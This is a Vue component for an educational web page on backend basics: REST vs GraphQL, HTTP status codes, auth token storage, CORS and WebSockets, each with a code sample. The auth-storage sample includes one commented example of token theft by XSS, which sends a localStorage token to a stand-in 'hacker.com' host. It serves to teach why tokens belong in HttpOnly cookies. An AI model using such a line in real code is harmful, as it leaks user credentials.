<template>
  <div class="learn-backend min-h-screen">
    <!-- Header -->
    <div class="px-4 md:px-8 py-8 pb-4 max-w-6xl mx-auto">
      <a href="/learn" class="inline-flex items-center gap-1 text-sm text-gray-400 hover:text-gray-900 dark:hover:text-white transition-colors mb-4">
        ← Back to Topics
      </a>
      <div class="flex items-center gap-3 mb-2">
        <span class="text-3xl">🔙</span>
        <h1 class="text-2xl md:text-3xl font-bold text-gray-900 dark:text-white">Backend Awareness</h1>
      </div>
      <p class="text-gray-500 dark:text-gray-400 text-sm md:text-base max-w-2xl">
        You are not a backend engineer, but you must understand the ecosystem. Master HTTP, Auth, and API design.
      </p>
    </div>

    <!-- Layout -->
    <div class="px-4 md:px-8 max-w-6xl mx-auto flex flex-col lg:flex-row gap-6 pb-16">
      <SectionNav
        :sections="sections"
        :activeSection="activeSection"
        activeColor="bg-indigo-600"
        @select="setSection"
        class="lg:w-56 flex-shrink-0"
      />

      <div class="flex-1 min-w-0 space-y-5">
        <!-- ==================== API DESIGN ==================== -->
         <template v-if="activeSection === 'api'">
          <ConceptCard
            id="rest-vs-graphql"
            icon="🔌"
            title="REST vs GraphQL"
            subtitle="Architectural Styles"
            definition="REST: Resource-based (GET /users/1). Multiple endpoints. Over-fetching common. GraphQL: Query-based (query { user(id: 1) { name } }). Single endpoint. Client defines exact data needs."
            analogy="REST is like ordering from a menu (you get the whole burger with fries). GraphQL is like a buffet (you take exactly the scoop of mac-n-cheese and 3 fries you want)."
            seniorTip="Don't choose GraphQL just because it's trendy. It adds complexity (caching, N+1 query problems). REST is often sufficient and easier to cache (HTTP/2 makes multiple requests cheap)."
            defaultOpen
          >
             <div class="p-4 rounded-xl bg-gray-100/80 dark:bg-white/5 border border-gray-200/50 dark:border-white/5 grid grid-cols-1 md:grid-cols-2 gap-4">
               <div>
                  <h4 class="font-bold text-blue-500 mb-2">REST</h4>
                  <ul class="text-xs space-y-1 text-gray-500">
                    <li>✅ Standard HTTP caching</li>
                    <li>✅ Simple to implement</li>
                    <li>❌ Over/Under fetching</li>
                    <li>❌ Multiple round trips</li>
                  </ul>
               </div>
               <div>
                  <h4 class="font-bold text-pink-500 mb-2">GraphQL</h4>
                  <ul class="text-xs space-y-1 text-gray-500">
                    <li>✅ Exact data fetching</li>
                    <li>✅ Single round trip</li>
                    <li>❌ Complex caching</li>
                    <li>❌ Large schema management</li>
                  </ul>
               </div>
             </div>
             <CodePlayground title="api-comparison.js" :initialCode="codes.apiComparison" />
          </ConceptCard>

          <ConceptCard
            id="status-codes"
            icon="🚦"
            title="HTTP Status Codes & Error Handling"
            subtitle="Speak the protocol"
            definition="2xx: Success. 3xx: Redirect. 4xx: Client Error (You messed up). 5xx: Server Error (They messed up). Key codes: 200 OK, 201 Created, 204 No Content, 400 Bad Request, 401 Unauthorized (Who are you?), 403 Forbidden (I know you, but no), 404 Not Found, 500 Server Error."
          >
             <CodePlayground title="error-handling.js" :initialCode="codes.errorHandling" />
          </ConceptCard>
        </template>

        <!-- ==================== AUTH & SECURITY ==================== -->
        <template v-if="activeSection === 'auth'">
          <ConceptCard
            id="auth-flows"
            icon="🔐"
            title="Authentication & Storage"
            subtitle="JWT vs Cookies vs Session"
            definition="JWT (Stateless): Server signs token, client stores it. Good for scalability. Cookie-Session (Stateful): Server stores ID, sends cookie. Good for security (HttpOnly). OAuth: Delegated auth (Login with Google)."
            seniorTip="NEVER store JWTs in localStorage (XSS vulnerable). Use HttpOnly Cookies. LocalStorage is for preferences (theme=dark), not security credentials."
            defaultOpen
          >
            <CodePlayground title="auth-storage.js" :initialCode="codes.auth" />
          </ConceptCard>

          <ConceptCard
            id="cors"
            icon="🚧"
            title="CORS (Cross-Origin Resource Sharing)"
            subtitle="The browser security guard"
            definition="Browsers block requests to a different domain unless the SERVER explicitly allows it via Headers (Access-Control-Allow-Origin). It is a BROWSER feature, not a server feature."
            analogy="CORS is like a bouncer at a club (Server). If you (Client) come from a different street (Origin), the bouncer checks the guest list. If your street isn't on it, you can't enter."
          >
             <CodePlayground title="cors-headers.js" :initialCode="codes.cors" />
          </ConceptCard>
        </template>

        <!-- ==================== REALTIME ==================== -->
        <template v-if="activeSection === 'realtime'">
           <ConceptCard
             id="websockets"
             icon="🔄"
             title="WebSockets & Polling"
             subtitle="Two-way communication"
             definition="Short Polling: Client asks 'Any news?' every 5s. Long Polling: Client asks, server waits until news exists to reply. WebSockets: Durable pipe, bidirectional real-time data."
           >
              <CodePlayground title="realtime.js" :initialCode="codes.realtime" />
           </ConceptCard>
        </template>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref } from 'vue'
import SectionNav from './SectionNav.vue'
import ConceptCard from './ConceptCard.vue'
import CodePlayground from './CodePlayground.vue'

const sections = [
  { id: 'api', label: 'API Design', icon: '🔌', badge: 'Core' },
  { id: 'auth', label: 'Auth & Security', icon: '🔐', badge: 'Critical' },
  { id: 'realtime', label: 'Realtime', icon: '🔄', badge: 'Adv' },
]

const activeSection = ref('api')

function setSection(id) {
  activeSection.value = id
  window.scrollTo({ top: 0, behavior: 'smooth' })
}

const codes = {
  apiComparison: `// 🔌 REST vs GraphQL Example

// REST (Multiple Round Trips)
async function getUserProfile(id) {
  // 1. Get User
  const user = await fetch(\`/users/\${id}\`).then(r => r.json())
  
  // 2. Get Posts
  const posts = await fetch(\`/users/\${id}/posts\`).then(r => r.json())
  
  return { ...user, posts }
}

// GraphQL (Single Trip, Exact Data)
const query = \`
  query {
    user(id: "1") {
      name
      avatar
      posts(limit: 5) {
        title
        likes
      }
    }
  }
\`
// Returns EXACTLY the shape above. No over-fetching.`,

  errorHandling: `// 🚦 Robust API Error Handling

async function safelyFetch(url) {
  try {
    const res = await fetch(url)
    
    // 4xx/5xx are NOT exceptions in fetch!
    if (!res.ok) {
      // Handle known operational errors
      if (res.status === 401) return logout()
      if (res.status === 403) return showForbiddenModal()
      if (res.status === 404) return null
      
      // Generic fallback
      throw new Error(\`API Error: \${res.status}\`)
    }
    
    return res.json()
    
  } catch (err) {
    // Network errors (offline) land here
    logToSentry(err)
    showToast("Connection failed. Retrying...")
  }
}`,

  auth: `// 🔐 Auth Storage Principles

// ❌ BAD: Storing in LocalStorage
// Vulnerable to XSS. Any JS on page can read this.
localStorage.setItem('token', 'secret-jwt')
// Malicious script:
// fetch('hacker.com?data=' + localStorage.getItem('token'))

// ✅ GOOD: HttpOnly Cookie
// Browser automatically sends this with requests.
// JS cannot read it (document.cookie returns nothing).
// Immune to XSS stealing.

// Backend Sets Header:
// Set-Cookie: token=xyz; HttpOnly; Secure; SameSite=Strict`,

  cors: `// 🚧 CORS Explained
// Scenario: Frontend (localhost:3000) -> API (api.com)

// Browser sends "Preflight" OPTIONS request first:
// OPTIONS /users
// Origin: http://localhost:3000

// Server MUST reply with:
// Access-Control-Allow-Origin: http://localhost:3000
// Access-Control-Allow-Methods: GET, POST
// Access-Control-Allow-Credentials: true (for cookies)

// If server misses header -> Browser blocks response.
// Note: The Server actually PROCESSED the request! 
// The Browser just hid the result from your JS code.`,

  realtime: `// 🔄 Realtime Strategies

// 1. Short Polling (Simple, wasteful)
setInterval(async () => {
  const data = await fetch('/api/news')
  updateUI(data)
}, 5000)

// 2. WebSockets (Robust, Realtime)
const socket = new WebSocket('ws://api.com/socket')

socket.onopen = () => console.log('Connected')

socket.onmessage = (event) => {
  const data = JSON.parse(event.data)
  // Instant update pushed from server!
  updateUI(data)
}

// Keep connection alive/reconnect logic needed!`
}
</script>
